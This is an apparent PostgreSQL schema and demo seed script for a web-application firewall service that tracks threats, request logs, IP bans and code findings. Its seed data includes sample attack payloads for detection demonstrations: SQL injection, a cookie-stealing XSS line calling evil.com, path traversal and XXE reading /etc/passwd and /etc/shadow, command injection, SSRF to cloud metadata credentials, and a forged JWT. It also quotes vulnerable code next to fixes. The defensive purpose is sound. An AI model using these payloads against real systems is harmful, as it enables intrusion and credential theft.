-- Extensions
CREATE EXTENSION IF NOT EXISTS pgcrypto;
CREATE EXTENSION IF NOT EXISTS btree_gist;
CREATE EXTENSION IF NOT EXISTS pg_trgm;

-- Core tables
CREATE TABLE IF NOT EXISTS users (
    id              SERIAL PRIMARY KEY,
    github_id       BIGINT NOT NULL UNIQUE,
    github_login    TEXT NOT NULL,
    avatar_url      TEXT,
    name            TEXT,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS sessions (
    id          UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    user_id     INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    expires_at  TIMESTAMPTZ NOT NULL DEFAULT NOW() + INTERVAL '30 days',
    ip_address  inet,
    user_agent  TEXT
);
CREATE INDEX IF NOT EXISTS idx_sessions_user ON sessions(user_id);
CREATE INDEX IF NOT EXISTS idx_sessions_expires ON sessions(expires_at);

CREATE TABLE IF NOT EXISTS sites (
    id              SERIAL PRIMARY KEY,
    user_id         INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    domain          TEXT NOT NULL UNIQUE,
    project_name    TEXT,
    upstream_ip     TEXT NOT NULL DEFAULT '0.0.0.0',
    original_cname  TEXT,
    status          TEXT NOT NULL DEFAULT 'pending'
                    CHECK (status IN ('pending','verifying','active',
                                      'ssl_provisioning','live','error')),
    verified_at     TIMESTAMPTZ,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    is_demo         BOOLEAN NOT NULL DEFAULT FALSE
);
CREATE INDEX IF NOT EXISTS idx_sites_domain ON sites(domain);
CREATE INDEX IF NOT EXISTS idx_sites_user ON sites(user_id);

CREATE TABLE IF NOT EXISTS threats (
    id              BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    site_id         INTEGER REFERENCES sites(id) ON DELETE CASCADE,
    technique_name  TEXT NOT NULL,
    category        TEXT NOT NULL DEFAULT 'sqli',
    source          TEXT,
    raw_payload     TEXT NOT NULL,
    severity        TEXT NOT NULL DEFAULT 'medium',
    discovered_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    tested_at       TIMESTAMPTZ,
    blocked         BOOLEAN NOT NULL DEFAULT FALSE,
    patched_at      TIMESTAMPTZ
);

CREATE TABLE IF NOT EXISTS request_log (
    id              BIGINT GENERATED ALWAYS AS IDENTITY,
    site_id         INTEGER NOT NULL,
    timestamp       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    raw_request     TEXT NOT NULL,
    classification  TEXT NOT NULL,
    confidence      REAL,
    classifier      TEXT NOT NULL,
    blocked         BOOLEAN NOT NULL DEFAULT FALSE,
    attack_type     TEXT,
    response_time_ms REAL,
    source_ip       inet,
    PRIMARY KEY (id, timestamp)
) PARTITION BY RANGE (timestamp);
CREATE INDEX IF NOT EXISTS idx_request_log_site ON request_log(site_id);

CREATE TABLE IF NOT EXISTS agent_log (
    id          BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    site_id     INTEGER REFERENCES sites(id) ON DELETE CASCADE,
    timestamp   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    agent       TEXT NOT NULL,
    action      TEXT NOT NULL,
    detail      TEXT,
    success     BOOLEAN NOT NULL DEFAULT TRUE
);

CREATE TABLE IF NOT EXISTS rules (
    id          BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    site_id     INTEGER REFERENCES sites(id) ON DELETE CASCADE,
    version     INTEGER NOT NULL DEFAULT 1,
    crusoe_prompt TEXT NOT NULL,
    claude_prompt TEXT NOT NULL,
    updated_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_by  TEXT NOT NULL DEFAULT 'system'
);

-- Behavioral tables
CREATE TABLE IF NOT EXISTS decisions (
    id                BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    ip                inet NOT NULL,
    decision_type     TEXT NOT NULL CHECK (decision_type IN ('ban','captcha','throttle','log_only')),
    scope             TEXT NOT NULL,
    duration_seconds  INTEGER,
    reason            TEXT,
    source            TEXT,
    confidence        REAL,
    created_at        TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    expires_at        TIMESTAMPTZ,
    site_id           INTEGER REFERENCES sites(id) ON DELETE CASCADE
);
CREATE INDEX IF NOT EXISTS idx_decisions_ip ON decisions USING gist (ip inet_ops);
CREATE INDEX IF NOT EXISTS idx_decisions_expires ON decisions(expires_at);

CREATE TABLE IF NOT EXISTS ip_reputation (
    ip              inet PRIMARY KEY,
    score           REAL DEFAULT 0.0,
    attack_count    INTEGER DEFAULT 0,
    tenant_count    INTEGER DEFAULT 0,
    attack_types    JSONB DEFAULT '[]',
    first_seen      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    last_seen       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    geo_country     TEXT,
    asn             TEXT,
    is_tor          BOOLEAN DEFAULT FALSE,
    is_vpn          BOOLEAN DEFAULT FALSE
);
CREATE INDEX IF NOT EXISTS idx_ip_reputation_score ON ip_reputation(score);

CREATE TABLE IF NOT EXISTS behavioral_sessions (
    id              BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    ip              inet NOT NULL,
    site_id         INTEGER NOT NULL REFERENCES sites(id) ON DELETE CASCADE,
    window_start    TIMESTAMPTZ,
    request_count   INTEGER DEFAULT 0,
    error_count     INTEGER DEFAULT 0,
    unique_paths    INTEGER DEFAULT 0,
    auth_failures   INTEGER DEFAULT 0,
    avg_interval_ms REAL,
    flags           JSONB DEFAULT '[]'
);
CREATE INDEX IF NOT EXISTS idx_behavioral_ip_site ON behavioral_sessions(ip, site_id);

CREATE TABLE IF NOT EXISTS endpoint_profiles (
    id                   BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    site_id              INTEGER NOT NULL REFERENCES sites(id) ON DELETE CASCADE,
    path_pattern         TEXT NOT NULL,
    sensitivity          TEXT DEFAULT 'MEDIUM',
    attack_frequency     REAL,
    false_positive_rate  REAL,
    skip_classification  BOOLEAN DEFAULT FALSE,
    force_deep_analysis  BOOLEAN DEFAULT FALSE,
    updated_at           TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Threat intelligence tables
CREATE TABLE IF NOT EXISTS threat_ips (
    id          BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    ip          inet NOT NULL,
    tier        TEXT NOT NULL CHECK (tier IN ('ban', 'block', 'scrutinize')),
    source      TEXT NOT NULL,
    fetched_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_threat_ips_containment ON threat_ips USING gist (ip inet_ops);
CREATE INDEX IF NOT EXISTS idx_threat_ips_source ON threat_ips(source);
CREATE UNIQUE INDEX IF NOT EXISTS idx_threat_ips_unique ON threat_ips(ip, source);

CREATE TABLE IF NOT EXISTS threat_feeds (
    id          SERIAL PRIMARY KEY,
    name        TEXT NOT NULL UNIQUE,
    url         TEXT NOT NULL,
    tier        INTEGER NOT NULL,
    last_fetch  TIMESTAMPTZ,
    last_success TIMESTAMPTZ,
    entry_count INTEGER DEFAULT 0,
    error       TEXT,
    enabled     BOOLEAN DEFAULT TRUE
);

-- CrowdSec Hub table
CREATE TABLE IF NOT EXISTS hub_rules (
    id            BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    hub_name      TEXT NOT NULL UNIQUE,
    hub_type      TEXT NOT NULL,
    version       TEXT,
    yaml_content  TEXT,
    imported_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    site_id       INTEGER REFERENCES sites(id) ON DELETE CASCADE,
    active        BOOLEAN DEFAULT TRUE
);

-- GitHub repo connection tables
CREATE TABLE IF NOT EXISTS github_tokens (
    user_id         INTEGER PRIMARY KEY REFERENCES users(id) ON DELETE CASCADE,
    encrypted_token TEXT NOT NULL,
    scopes          TEXT NOT NULL DEFAULT 'read:user',
    updated_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS site_repos (
    site_id         INTEGER PRIMARY KEY REFERENCES sites(id) ON DELETE CASCADE,
    repo_owner      TEXT NOT NULL,
    repo_name       TEXT NOT NULL,
    default_branch  TEXT NOT NULL DEFAULT 'main',
    connected_at    TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS code_findings (
    id              BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    site_id         INTEGER NOT NULL REFERENCES sites(id) ON DELETE CASCADE,
    threat_id       BIGINT REFERENCES threats(id),
    file_path       TEXT NOT NULL,
    line_start      INTEGER,
    line_end        INTEGER,
    snippet         TEXT,
    finding_type    TEXT NOT NULL,
    confidence      REAL NOT NULL,
    description     TEXT NOT NULL,
    suggested_fix   TEXT,
    status          TEXT NOT NULL DEFAULT 'open'
                    CHECK (status IN ('open','acknowledged','fixed','false_positive')),
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_code_findings_site ON code_findings(site_id);
CREATE INDEX IF NOT EXISTS idx_code_findings_threat ON code_findings(threat_id);

-- Add is_demo column if missing (safe for existing deployments)
ALTER TABLE sites ADD COLUMN IF NOT EXISTS is_demo BOOLEAN NOT NULL DEFAULT FALSE;

-- Add upstream_scheme column (http or https, default https)
ALTER TABLE sites ADD COLUMN IF NOT EXISTS upstream_scheme TEXT NOT NULL DEFAULT 'https';

-- Add upstream_port column (default 443 for https)
ALTER TABLE sites ADD COLUMN IF NOT EXISTS upstream_port INTEGER NOT NULL DEFAULT 443;

-- Clean CIDR suffixes from upstream_ip (e.g. 18.133.32.79/32 → 18.133.32.79)
UPDATE sites SET upstream_ip = split_part(upstream_ip, '/', 1) WHERE upstream_ip LIKE '%/%';

-- ============================================================================
-- Demo site seed data
-- ============================================================================

-- Create a demo user (idempotent via ON CONFLICT)
INSERT INTO users (github_id, github_login, avatar_url, name)
VALUES (0, 'veil-demo', 'https://avatars.githubusercontent.com/u/0', 'Veil Demo')
ON CONFLICT (github_id) DO NOTHING;

-- Create the demo site (idempotent via ON CONFLICT on domain)
INSERT INTO sites (user_id, domain, project_name, upstream_ip, status, verified_at, created_at, is_demo)
SELECT u.id, 'demo.veil.example', 'Demo VulnShop', '18.133.32.79', 'active', NOW(), NOW() - INTERVAL '7 days', TRUE
FROM users u WHERE u.github_login = 'veil-demo'
ON CONFLICT (domain) DO UPDATE SET is_demo = TRUE;

-- Seed realistic demo data only if the demo site has no request_log entries
DO $$
DECLARE
    demo_site_id INTEGER;
    demo_has_data BOOLEAN;
BEGIN
    SELECT id INTO demo_site_id FROM sites WHERE domain = 'demo.veil.example';
    IF demo_site_id IS NULL THEN RETURN; END IF;

    SELECT EXISTS(SELECT 1 FROM request_log WHERE site_id = demo_site_id LIMIT 1) INTO demo_has_data;
    IF demo_has_data THEN RETURN; END IF;

    -- Seed threats
    INSERT INTO threats (site_id, technique_name, category, source, raw_payload, severity, discovered_at, tested_at, blocked) VALUES
        (demo_site_id, 'Union-based SQL injection', 'sqli', 'peek', $T$GET /api/users?id=1' UNION SELECT username,password FROM users-- HTTP/1.1$T$, 'high', NOW() - INTERVAL '6 days', NOW() - INTERVAL '5 days', TRUE),
        (demo_site_id, 'Blind boolean SQLi', 'sqli', 'peek', $T$GET /products?cat=1 AND 1=1-- HTTP/1.1$T$, 'high', NOW() - INTERVAL '5 days', NOW() - INTERVAL '4 days', TRUE),
        (demo_site_id, 'Reflected XSS in search', 'xss', 'peek', $T$GET /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script> HTTP/1.1$T$, 'high', NOW() - INTERVAL '5 days', NOW() - INTERVAL '4 days', TRUE),
        (demo_site_id, 'SVG onload XSS', 'xss', 'peek', $T$GET /upload?name=<svg onload=alert(1)> HTTP/1.1$T$, 'medium', NOW() - INTERVAL '4 days', NOW() - INTERVAL '3 days', TRUE),
        (demo_site_id, 'Path traversal to /etc/passwd', 'path_traversal', 'peek', $T$GET /files?path=../../../../etc/passwd HTTP/1.1$T$, 'high', NOW() - INTERVAL '4 days', NOW() - INTERVAL '3 days', TRUE),
        (demo_site_id, 'Command injection via ping', 'command_injection', 'peek', $T$GET /api/health?host=localhost;cat /etc/passwd HTTP/1.1$T$, 'critical', NOW() - INTERVAL '3 days', NOW() - INTERVAL '2 days', TRUE),
        (demo_site_id, 'SSRF to AWS metadata', 'ssrf', 'peek', $T$GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1$T$, 'critical', NOW() - INTERVAL '3 days', NOW() - INTERVAL '2 days', TRUE),
        (demo_site_id, 'XXE file read', 'xxe', 'peek', $T$POST /api/import HTTP/1.1\nContent-Type: text/xml\n\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>$T$, 'high', NOW() - INTERVAL '2 days', NOW() - INTERVAL '1 day', TRUE),
        (demo_site_id, 'JWT none algorithm bypass', 'auth_bypass', 'peek', $T$GET /api/admin HTTP/1.1\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.$T$, 'critical', NOW() - INTERVAL '2 days', NOW() - INTERVAL '1 day', TRUE),
        (demo_site_id, 'Double-encoded path traversal', 'encoding_evasion', 'peek', $T$GET /%252e%252e/%252e%252e/etc/passwd HTTP/1.1$T$, 'medium', NOW() - INTERVAL '1 day', NOW() - INTERVAL '6 hours', TRUE);

    -- Seed request log entries (mix of SAFE, SUSPICIOUS, MALICIOUS)
    INSERT INTO request_log (site_id, timestamp, raw_request, classification, confidence, classifier, blocked, attack_type, response_time_ms, source_ip) VALUES
        -- Safe requests
        (demo_site_id, NOW() - INTERVAL '30 minutes', 'GET /products HTTP/1.1\nHost: vulnshop.io\nUser-Agent: Mozilla/5.0', 'SAFE', 0.95, 'regex', FALSE, 'none', 0.8, '79.140.217.34'),
        (demo_site_id, NOW() - INTERVAL '28 minutes', 'GET /static/app.js HTTP/1.1\nHost: vulnshop.io', 'SAFE', 0.95, 'regex', FALSE, 'none', 0.3, '79.140.217.34'),
        (demo_site_id, NOW() - INTERVAL '25 minutes', 'GET /api/products?page=1 HTTP/1.1\nHost: vulnshop.io', 'SAFE', 0.85, 'regex', FALSE, 'none', 1.2, '192.168.1.50'),
        (demo_site_id, NOW() - INTERVAL '22 minutes', 'POST /api/cart HTTP/1.1\nHost: vulnshop.io\nContent-Type: application/json\n\n{"product_id": 42}', 'SAFE', 0.85, 'regex', FALSE, 'none', 2.1, '10.0.0.15'),
        -- Malicious requests
        (demo_site_id, NOW() - INTERVAL '20 minutes', $T$GET /api/users?id=1' OR '1'='1 HTTP/1.1\nHost: vulnshop.io\nUser-Agent: sqlmap/1.7$T$, 'MALICIOUS', 0.97, 'regex', TRUE, 'sqli', 0.9, '185.220.101.42'),
        (demo_site_id, NOW() - INTERVAL '19 minutes', $T$GET /api/users?id=1 UNION SELECT password FROM users-- HTTP/1.1\nHost: vulnshop.io\nUser-Agent: sqlmap/1.7$T$, 'MALICIOUS', 0.98, 'regex', TRUE, 'sqli', 0.7, '185.220.101.42'),
        (demo_site_id, NOW() - INTERVAL '18 minutes', $T$GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1\nHost: vulnshop.io$T$, 'MALICIOUS', 0.93, 'regex', TRUE, 'xss', 1.1, '91.132.147.168'),
        (demo_site_id, NOW() - INTERVAL '16 minutes', $T$GET /files?path=../../../../etc/passwd HTTP/1.1\nHost: vulnshop.io$T$, 'MALICIOUS', 0.92, 'regex', TRUE, 'path_traversal', 0.6, '91.132.147.168'),
        (demo_site_id, NOW() - INTERVAL '14 minutes', $T$GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: vulnshop.io$T$, 'MALICIOUS', 0.89, 'regex', TRUE, 'ssrf', 1.5, '45.33.32.156'),
        -- Suspicious / scanner requests
        (demo_site_id, NOW() - INTERVAL '12 minutes', 'GET /.env HTTP/1.1\nHost: vulnshop.io\nUser-Agent: Go-http-client/1.1', 'SUSPICIOUS', 0.88, 'regex', FALSE, 'scanner', 0.4, '198.51.100.23'),
        (demo_site_id, NOW() - INTERVAL '11 minutes', 'GET /wp-admin HTTP/1.1\nHost: vulnshop.io\nUser-Agent: Nikto/2.1.6', 'SUSPICIOUS', 0.90, 'regex', FALSE, 'scanner', 0.5, '198.51.100.23'),
        (demo_site_id, NOW() - INTERVAL '10 minutes', 'GET /phpinfo.php HTTP/1.1\nHost: vulnshop.io\nUser-Agent: Nikto/2.1.6', 'SUSPICIOUS', 0.88, 'regex', FALSE, 'scanner', 0.3, '198.51.100.23'),
        -- More malicious
        (demo_site_id, NOW() - INTERVAL '8 minutes', $T$POST /api/login HTTP/1.1\nHost: vulnshop.io\nContent-Type: application/json\n\n{"username":"admin' OR '1'='1","password":"x"}$T$, 'MALICIOUS', 0.96, 'regex', TRUE, 'sqli', 1.0, '103.152.220.44'),
        (demo_site_id, NOW() - INTERVAL '6 minutes', $T$GET /api/health?host=localhost;whoami HTTP/1.1\nHost: vulnshop.io$T$, 'MALICIOUS', 0.94, 'regex', TRUE, 'command_injection', 0.8, '103.152.220.44'),
        (demo_site_id, NOW() - INTERVAL '4 minutes', $T$POST /api/import HTTP/1.1\nHost: vulnshop.io\nContent-Type: text/xml\n\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><data>&xxe;</data>$T$, 'MALICIOUS', 0.91, 'regex', TRUE, 'xxe', 1.3, '45.33.32.156'),
        (demo_site_id, NOW() - INTERVAL '2 minutes', 'GET /products HTTP/1.1\nHost: vulnshop.io\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64)', 'SAFE', 0.85, 'regex', FALSE, 'none', 0.9, '79.140.217.34');

    -- Seed agent log entries
    INSERT INTO agent_log (site_id, timestamp, agent, action, detail, success) VALUES
        (demo_site_id, NOW() - INTERVAL '6 days', 'peek', 'scan', 'Discovered 3 new techniques in categories [sqli, xss, path_traversal]', TRUE),
        (demo_site_id, NOW() - INTERVAL '5 days', 'poke', 'test', 'Tested 3 threats, 1 bypass found (Blind boolean SQLi)', TRUE),
        (demo_site_id, NOW() - INTERVAL '5 days', 'patch', 'patch', 'Rules v2: fixed 1/1 bypasses. Added boolean-based blind detection.', TRUE),
        (demo_site_id, NOW() - INTERVAL '4 days', 'peek', 'scan', 'Discovered 2 new techniques in categories [command_injection, ssrf]', TRUE),
        (demo_site_id, NOW() - INTERVAL '3 days', 'poke', 'test', 'Tested 7 threats, all blocked successfully.', TRUE),
        (demo_site_id, NOW() - INTERVAL '2 days', 'learn', 'analyse', 'Auto-banned 2 repeat offender IPs. Top attacks: sqli(5), xss(3), path_traversal(2).', TRUE),
        (demo_site_id, NOW() - INTERVAL '1 day', 'peek', 'scan', 'Discovered 3 new techniques in categories [xxe, auth_bypass, encoding_evasion]', TRUE),
        (demo_site_id, NOW() - INTERVAL '12 hours', 'poke', 'test', 'Tested 10 threats, all blocked. Regression test passed.', TRUE),
        (demo_site_id, NOW() - INTERVAL '6 hours', 'learn', 'analyse', 'Cycle 8 learn: Regex caught 12 threats (CrowdSec: 610 UA patterns, 18 SQLi, 36 XSS). Auto-throttled 1 IP.', TRUE),
        (demo_site_id, NOW() - INTERVAL '1 hour', 'patch', 'code_scan', 'Found 3 vulnerable code locations across 1 repo', TRUE);

    -- Seed decisions
    INSERT INTO decisions (ip, decision_type, scope, duration_seconds, reason, source, confidence, created_at, expires_at, site_id) VALUES
        ('185.220.101.42'::inet, 'ban', 'ip', 86400, 'Auto-banned: 5 blocked attacks ([sqli])', 'learn-agent', 0.92, NOW() - INTERVAL '2 days', NOW() + INTERVAL '22 hours', demo_site_id),
        ('91.132.147.168'::inet, 'ban', 'ip', 86400, 'Auto-banned: 4 blocked attacks ([xss, path_traversal])', 'learn-agent', 0.90, NOW() - INTERVAL '1 day', NOW() + INTERVAL '23 hours', demo_site_id),
        ('103.152.220.44'::inet, 'throttle', 'ip', 3600, 'Auto-throttled: 3 blocked attacks ([sqli, command_injection])', 'learn-agent', 0.85, NOW() - INTERVAL '6 hours', NOW() + INTERVAL '30 minutes', demo_site_id),
        ('198.51.100.23'::inet, 'throttle', 'ip', 3600, 'Auto-throttled: 3 scanner detections', 'learn-agent', 0.82, NOW() - INTERVAL '10 minutes', NOW() + INTERVAL '50 minutes', demo_site_id);

    -- Seed code findings
    INSERT INTO code_findings (site_id, file_path, line_start, line_end, snippet, finding_type, confidence, description, suggested_fix, status) VALUES
        (demo_site_id, 'src/api/users.js', 45, 52, $S$const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
const result = await db.query(query);$S$, 'sqli', 0.95, 'Direct string interpolation of user input into SQL query. The req.params.id value is inserted directly without parameterised queries, enabling SQL injection.', $S$Use parameterised queries:
const result = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);$S$, 'open'),
        (demo_site_id, 'src/components/Search.jsx', 112, 115, $S$<div dangerouslySetInnerHTML={{ __html: searchResult.description }} />$S$, 'xss', 0.90, 'User-controlled content rendered via dangerouslySetInnerHTML without sanitisation, enabling reflected XSS through search results.', $S$Sanitise before rendering:
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(searchResult.description) }} />$S$, 'open'),
        (demo_site_id, 'src/api/files.js', 23, 28, $S$const filePath = path.join(uploadDir, req.query.path);
const content = fs.readFileSync(filePath, 'utf-8');$S$, 'path_traversal', 0.92, 'No path normalisation or validation. An attacker can use ../ sequences to read arbitrary files outside the upload directory.', $S$Validate the resolved path stays within bounds:
const resolved = path.resolve(uploadDir, req.query.path);
if (!resolved.startsWith(path.resolve(uploadDir))) {
  return res.status(403).json({ error: 'Forbidden' });
}$S$, 'open');

END $$;

-- SSE notification triggers
CREATE OR REPLACE FUNCTION notify_request_log() RETURNS trigger AS $$
BEGIN
    PERFORM pg_notify('request_stream', json_build_object(
        'id', NEW.id, 'site_id', NEW.site_id, 'timestamp', NEW.timestamp,
        'raw_request', left(NEW.raw_request, 120), 'classification', NEW.classification,
        'confidence', NEW.confidence, 'classifier', NEW.classifier,
        'blocked', NEW.blocked, 'attack_type', NEW.attack_type,
        'response_time_ms', NEW.response_time_ms, 'source_ip', NEW.source_ip
    )::text);
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_request_log_notify ON request_log;
CREATE TRIGGER trg_request_log_notify
    AFTER INSERT ON request_log FOR EACH ROW EXECUTE FUNCTION notify_request_log();

CREATE OR REPLACE FUNCTION notify_agent_log() RETURNS trigger AS $$
BEGIN
    PERFORM pg_notify('agent_stream', json_build_object(
        'id', NEW.id, 'site_id', NEW.site_id, 'timestamp', NEW.timestamp,
        'agent', NEW.agent, 'action', NEW.action,
        'detail', left(NEW.detail, 200), 'success', NEW.success
    )::text);
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_agent_log_notify ON agent_log;
CREATE TRIGGER trg_agent_log_notify
    AFTER INSERT ON agent_log FOR EACH ROW EXECUTE FUNCTION notify_agent_log();

-- Code findings notification trigger
CREATE OR REPLACE FUNCTION notify_code_finding() RETURNS trigger AS $$
BEGIN
    PERFORM pg_notify('finding_stream', json_build_object(
        'id', NEW.id, 'site_id', NEW.site_id, 'file_path', NEW.file_path,
        'line_start', NEW.line_start, 'line_end', NEW.line_end,
        'snippet', left(COALESCE(NEW.snippet, ''), 300),
        'finding_type', NEW.finding_type, 'confidence', NEW.confidence,
        'description', left(NEW.description, 300),
        'suggested_fix', left(COALESCE(NEW.suggested_fix, ''), 300),
        'status', NEW.status, 'created_at', NEW.created_at
    )::text);
    RETURN NEW;
END;
$$ LANGUAGE plpgsql;

DROP TRIGGER IF EXISTS trg_code_finding_notify ON code_findings;
CREATE TRIGGER trg_code_finding_notify
    AFTER INSERT ON code_findings FOR EACH ROW EXECUTE FUNCTION notify_code_finding();
